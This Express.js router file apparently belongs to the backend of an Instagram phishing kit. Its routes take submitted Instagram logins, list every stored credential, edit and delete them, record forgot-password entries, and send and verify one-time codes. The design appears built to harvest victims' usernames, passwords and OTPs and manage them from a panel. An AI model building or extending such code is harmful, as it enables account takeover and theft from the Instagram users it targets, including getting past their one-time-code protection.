const express = require('express');
const router = express.Router();

const {
  instagramLogin,
  getAllCredentials,
  updateCredential,
  deleteCredential,
  deleteCredentials,
  deleteAllCredentials,
} = require('../controllers/instagram.controller');

const { sendOtp, verifyOtpHandler } = require('../controllers/otp.controller');

const {
  getAllForgot,
  deleteAllForgot,
  deleteForgot,
  deleteForgotBulk,
} = require('../controllers/forgot.controller');

// ── Login / Credentials routes ──
router.get('/login',           getAllCredentials);
router.post('/login',          instagramLogin);
router.delete('/login/all',    deleteAllCredentials);
router.put('/login/:id',       updateCredential);
router.delete('/login/:id',    deleteCredential);
router.delete('/login',        deleteCredentials);

// ── Forgot password routes ──
router.get('/forgot',          getAllForgot);
router.delete('/forgot/all',   deleteAllForgot);
router.delete('/forgot/:id',   deleteForgot);
router.delete('/forgot',       deleteForgotBulk);

// ── OTP routes ──
router.post('/otp/send',       sendOtp);
router.post('/otp/verify',     verifyOtpHandler);

// ── Backward-compatible aliases on root ──
router.get('/',                getAllCredentials);
router.delete('/all',          deleteAllCredentials);
router.put('/:id',             updateCredential);
router.delete('/:id',          deleteCredential);
router.delete('/',             deleteCredentials);

module.exports = router;
